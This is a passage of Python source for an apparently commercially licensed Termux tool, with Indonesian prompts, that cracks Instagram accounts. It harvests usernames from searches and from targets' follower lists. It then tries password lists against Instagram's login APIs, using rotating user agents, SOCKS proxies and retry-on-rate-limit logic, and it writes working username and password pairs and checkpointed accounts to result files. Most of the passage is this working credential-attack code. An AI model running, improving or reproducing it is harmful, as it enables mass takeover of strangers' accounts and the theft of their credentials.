				head = {'X-IG-Connection-Speed': f'{rr(111,3700)}kbps', 'Accept': '*/*', 'X-IG-Connection-Type': rc(['MOBILE(LTE)', 'WIFI']), 'X-IG-App-ID': '124024574287414', 'Accept-Encoding': 'br, gzip, deflate', 'Accept-Language': 'id-ID', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-IG-ABR-Connection-Speed-KBPS': '0', 'Content-Length': f'{len(str(date))}', 'User-Agent': self.ua_rmx(), 'Connection': 'keep-alive', 'X-IG-Capabilities': '36r/dw=='}
				xnxx = ses.post("https://i.instagram.com/api/v1/accounts/login/", data=date, headers=head)
				logtemp +=1
				ncek=json.loads(xnxx.text)
				if "logged_in_user" in str(ncek):
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n')
					break
				elif 'https://i.instagram.com/challenge' in str(xnxx.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n')
					break
				elif 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10);self.crackAPI2(user,pas)
					open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
					loop-=1
					break
				else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
				self.crackAPI2(user,pas)
				loop-=1
				break
		loop+=1
	def V6(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		ua=self.ua_baru()
		for pw in pas:
			try:
				ses.get('https://www.instagram.com/web/__mid')
				head={'Host': 'www.instagram.com','Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.9','Content-Length':'353','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.instagram.com','Referer':'https://www.instagram.com/accounts/login/?force_classic_login=&','Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"','Sec-Ch-Ua-Mobile':'?0','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent': ua,'X-Asbd-Id':'129477','X-Csrftoken': ses.cookies['csrftoken'],'X-Ig-App-Id':'936619743392459','X-Ig-Www-Claim':'hmac.AR05k4r4Hi4qW2gWrhumyq_wGultMubwNGuatj_4cas9Lr1e','X-Instagram-Ajax':'1007725354','X-Requested-With':'XMLHttpRequest'}
				data = {'enc_password': self.encpwd(pw),'optIntoOneTap': 'false','queryParams': {},'trustedDeviceRecords': {},'username':user}
				respon=ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=head,data=data)
				haris=json.loads(respon.text)
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "/challenge/action" in str(haris):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
			#except Exception as e:prints(e)
		loop+=1
	def checkAPI(self,user,pw):
		ses=requests.Session()
		ncek=random.randint(1000000000, 99999999999)
		ts = calendar.timegm(current_GMT)
		nip=random.choice(prox)
		proxs= {'http': 'socks4://'+nip}
		ua = self.ua_sendiri()
		try:
			p=ses.get('https://www.instagram.com/web/__mid')
			ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'6543adcc6d29',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent':ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/login/',
                     'accept-encoding':'gzip, deflate',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": False,
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
			respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, proxies = proxs, allow_redirects=True)
			ncek=json.loads(respon.text)
			if 'userId' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
				open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'checkpoint_url' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
				open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'Please wait a few minutes' in str(respon.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
			else:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}Akun telah diganti password",width=80,padding=(0,4),style=""))
		except requests.ConnectionError:
			sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
		except Exception as e:prints(e)
			#self.checkAPI(user,pw) 	 
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t    {M2}!!!{hapus} Cek Hasil Akun Crack", padding=(0,4),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}1{P2}] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}2{P2}] Cek hasil akun {K2}checkpoint{hapus}",padding=(0,5),style=f"{color_table}"))
		self.tol.print(Columns(urut))
		one=input("Pilihanmu : ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] tidak ada hasil success");time.sleep(1);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil success");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] tidak hasil success");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/checkpoint/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun')		
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/checkpoint/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil checkpoint");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		else:print(f" [{M}!{N}] isi yang benar");time.sleep(2);self.menu()
	def menu(self):
		self.logo()
	#	prints(Panel(f"""\t {P2}Ketik {M2}Bug {P2}Untuk Melaporkan Bug Script""",width=80,padding=(0,7),style=f"{color_table}"))
		c=input(f'•{N} Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			prints(Panel(f"{P2}Crack Dari Pencarian Nama",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N} • Masukan nama :{N} ')
			pr=f"Tekan {M2}CTRL + C{hapus} Untuk Berhenti Dump Username"
			so=nel(pr,style="")
			sol().print(so)
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			prints(Panel(f"{P2}Crack Dari Pengikut",width=80,padding=(0,2),style=f"{color_table}"))
			#massal(self)
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('3','03'):
			prints(Panel(f"{P2}Crack Dari Mengikut",width=80,padding=(0,2),style=f"{color_table}"))
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('4','04'):
			print('')
			for i in os.listdir('result/checkpoint/'):
				print(f' [{U}!{C}] {i}')
			c=input(f'\n [{CY}?{N}] Masukan nama file: {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{CY} [+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.checkAPI(user,pwd)
			wel='# CRACK ULANG SELESAI'
			cik2=mark(wel ,style='green')
			sol().print(cik2)
			exit()
		elif c in ('5','05'):
			self.cek_hasil()
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			nama="unfollow"
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',x_id,nama)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ('lain','Lain'):
			ganti_tema()
		elif c in ('bug','Bug','BUG'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()
		else:
			self.menu()
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()   
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  login_kamu()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()
def mengi(self):
			try:
				menudump.append('mengikuti')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
				m=int(input(f'{N}•{N} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print('\r')
				prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
				nama=input(f' [{t}] Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',id,nama)
			self.passwordAPI(info)
def meng(self):
			menudump.append('mengikuti')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
			id=self.idAPI(self.cookie,nama)
			info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=200',id,nama)
			self.passwordAPI(info)
def masal(self):
			try:
				menudump.append('pengikut')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
				m=int(input(f'{H}•{H} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print(f"[white]Total Username Terkumpul : [green]{len(internal)}")
				nama=input(f'{N}• Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,nama)
			self.passwordAPI(info)
def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
			m=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,m)
			self.passwordAPI(info)
def ganti_tema():
         prints(Panel(f"""{P2}[{color_rich}01{P2}]. Ganti Warna Tema Merah  [{color_rich}06{P2}]. Ganti Warna Tema Pink
[{color_rich}02{P2}]. Ganti Warna Tema Hijau  [{color_rich}07{P2}]. Ganti Warna Tema Cyan
[{color_rich}03{P2}]. Ganti Warna Tema Kuning [{color_rich}08{P2}]. Ganti Warna Tema Putih
[{color_rich}04{P2}]. Ganti Warna Tema Biru   [{color_rich}09{P2}]. Ganti Warna Tema Orange
[{color_rich}05{P2}]. Ganti Warna Tema Ungu   [{color_rich}10{P2}]. Ganti Warna Tema Abu-Abu""",width=80,padding=(0,7),style=f"{color_table}"))
         ask = input(f"• Pilih Tema : ")
         if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
         elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
         elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
         elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
         elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
         elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
         elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
         elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
         elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
         elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
         open("assets/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
         prints(Panel(f"""{P2}Berhasil Mengganti Tema Ke {teks}, Silahkan Jalankan Ulang Tools Nya""",width=80,padding=(0,6),style=f"{color_table}"))
         sys.exit()
def register_device():
	while True:
		clear()
		banner()
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key = open("/data/data/com.termux/files/usr/etc/.license","r").read()
			check = requests.get("https://pastebin.com/raw/83EMYMa2").text
			if key in check:
				clear()
				banner()
				lisensiku.append("sukses")
				cetak(nel(f" {H2} Key anda telah di konfirmasi ✓{hapus}"))
				time.sleep(1.5)
				login_kamu()
			else:
				pr=(f'# YOUR KEY : {key}')
				po=mark(pr,style='red')
				cetak(nel(po, style= ''))
				cetak(nel(f"[•] {M2}Key anda belum di konfirmasi{hapus}\n[•] {M2}Silahkan Beli Ke Wa {hapus}{H2}+6283114591358{hapus}{M2} untuk menggunakan sc{hapus}"))
				buy_key=input('  Tekan enter untuk chat whatsapp author untuk membeli key')
				if buy_key in [""]:pass
				jalan(f'  Anda akan diarahkan ke whatsapp author');time.sleep(2)
				os.system(f'xdg-open http://wa.me/+6283114591358?text=Bang+beli+key+sc+instagram+{key}')

		if not os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key_gen = random.randint(10000000,99999999)
			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
			with open("/data/data/com.termux/files/usr/etc/.license","w") as tulis:
				tulis.write(enc_key)
			
			continue
		
		break

if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('mkdir result/success')
	except:pass
	try:os.system('mkdir result/checkpoint')
	except:pass
	try:
		with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/u2CEgeBR').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/FGnuNuHZ').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         login_kamu()
	except Exception as e:
		prints(e)